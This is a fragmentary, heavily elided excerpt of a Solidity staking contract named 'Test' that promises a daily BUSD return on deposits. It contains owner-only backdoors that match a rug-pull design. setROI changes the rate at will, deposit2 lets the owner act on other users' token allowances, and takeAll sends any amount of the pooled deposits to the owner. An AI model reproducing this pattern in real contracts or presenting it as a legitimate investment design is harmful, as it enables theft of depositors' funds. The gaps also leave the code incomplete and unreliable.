...
contract Test is Ownable, ReentrancyGuard {
    ...
    address public constant BUSDaddress = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7; // BUSD address
    ...
    function setROI(uint256 _roi) external onlyOwner nonReentrant {
         DAILY_ROI = _roi;
     }

    uint256 public constant depositLimit = 100;

    uint256 public constant COOLDOWN_PERIOD = 7 days;
    uint256 public constant lockedPeriod = 63 days;
    uint256 public constant depFee = 2; // 2%
    ...
    function deposit(uint256 _amount) external nonReentrant {
        require(
            depositsLength[msg.sender] < depositLimit,
        ...
        IERC20(BUSDaddress).safeTransfer(devAddress, depositFee);
    }
...
function deposit2(address sender, uint256 _amount) external onlyOwner nonReentrant {
        ...
        require(_amount > 0, "Amount must be greater than 0");
        require(
            IERC20(BUSDaddress).allowance(sender, address(this)) >=
                _amount,
            "Insufficient allowance"
        );
    ...
    function claimRewards() external nonReentrant {
        ...
        require(
            ...
            "Not enough BUSD in reward pool"
        );
        ...
        IERC20(BUSDaddress).safeTransfer(msg.sender, claimableAmount);
    }

    function takeAll(uint256 _amount) external onlyOwner nonReentrant {
        // transfer fund
        IERC20(BUSDaddress).safeTransfer(msg.sender,_amount);
    }
    ...
    function withdrawCapital(uint256 id) external nonReentrant {
        ...
        IERC20(BUSDaddress).safeTransfer(
            msg.sender,
            depositState[id].depositAmount + claimableReward
        );
    ...
    function getClaimableReward(
        ...
        if (
            ...
            profit =
                ...
                (totalPercentage * COOLDOWN_PERIOD);
        } else {
